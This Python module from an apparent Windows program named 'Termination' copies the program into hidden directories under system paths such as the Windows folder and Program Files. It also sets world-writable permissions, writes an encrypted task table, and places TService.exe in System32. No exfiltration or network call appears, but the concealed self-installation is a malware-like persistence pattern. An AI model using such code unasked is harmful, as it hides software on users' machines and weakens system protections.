from .T_imports import *
from .T_AdministratorMode import AdministratorMode
from .T_FIO import *
from .T_CDLL import *


class PDir:
    def __init__(self, master: 'Termination4.Termination', name: str, Admin: AdministratorMode):
        self.master=master
        self.name=name
        self.__init_values__()
    def __init_values__(self):
        self.SystemDrive=os.getenv("SystemDrive")+"\\"
        self.__need_work_paths__=[
                os.path.join(os.getenv("windir"), self.name),
                os.path.join(self.SystemDrive, "ProgramData", self.name),
                os.path.join(self.SystemDrive, "Program Files", self.name),
                os.path.join(self.SystemDrive, "Program Files (x86)", self.name),
                os.path.join(self.SystemDrive, self.name),
        ]
        self.L3T_file="{\"LocalTimeTaskTable\":{}}" # Local Time Task Table (LTTT)
        self.System32=os.path.join(os.getenv("windir"), "System32")
    def __init_work_dir_values__(self):
        for i in self.__need_work_paths__:
            if os.path.isdir(i):
                self.__need_work_path__=i
                break
        self.__need_file__=os.path.join(self.__need_work_path__, "Termination.exe") if self.master.GetWorkMod() == "exe" else os.path.join(self.__need_work_path__, "Termination.py")
        self.__need_L3T__=os.path.join(self.__need_work_path__, "L3T.gkbd")
        self.__need_TService__=os.path.join(self.System32, "TService.exe")
        print(f"NeedFile: {self.__need_file__}")
    def Is_NeedWorkPath(self):
        return os.path.abspath(self.master.__work_path__).lower() in list(map(lambda x: os.path.abspath(x).lower(), self.__need_work_paths__))
    def Copy(self):
        #if self.Is_NeedWorkPath(): return True
        _=True
        for i in self.__need_work_paths__:
            if os.path.isdir(i):
                print(f"Found Need Work: [{i}]")
                FIO.HideFile(i)
                _=False
                break
            try:
                os.makedirs(i)
                FIO.HideFile(i)
            except:
                print(f"Dir Makedir ERROR: [{i}]")
            else:
                print(f"Makedir: [{i}]")
                _=False
                break
        if _: return False
        if not sum([os.path.isdir(i) for i in self.__need_work_paths__]): return False
        self.__init_work_dir_values__()
        return self.WriteFiles()
    def WriteFiles(self):
        try:
            if self.master.tpll.FileSystemPermissionEnforcer.enforcePermissionsRecursive(self.__need_work_path__): print("Successfully Enforced Permissions For __need_work_path__")
            else: print("Failed To Enforce Permissions For __need_work_path__")
            os.chmod(self.__need_work_path__, 0o777)
            os.chmod(self.__need_file__, 0o777)
            os.chmod(self.__need_L3T__, 0o777)
            os.chmod(self.__need_TService__, 0o777)
        except: print("ChMod Error")
        try:
            #if not os.path.isfile(self.__need_file__):
            if os.path.abspath(self.master.__file__).lower() != os.path.abspath(self.__need_file__).lower():
                try: FIO.openw(self.__need_file__, FIO.openr(self.master.__file__, 2), 2)
                except:
                    try: FIO.openw(self.__need_file__, self.master.__file_bytes__, 2)
                    except:
                        print("Write Main Error")
                        traceback.print_exc()
            if not os.path.isfile(self.__need_L3T__) or not self._verify_L3T():
                FIO.openw(self.__need_L3T__, self.master.GodKeys.encrypt(self.L3T_file), 2)
            if not os.path.isfile(self.__need_TService__):
                FIO.openw(self.__need_TService__, FIO.openr(self.master.Static_ServiceEXE, 2), 2)
        except:
            print("File Copy ERROR")
            traceback.print_exc()
            return False
        return True
    def _verify_L3T(self):
        try: ast.literal_eval(self.master.GodKeys.decrypt(FIO.openr(self.__need_L3T__, 2)))["LocalTimeTaskTable"]
        except: return False
        return True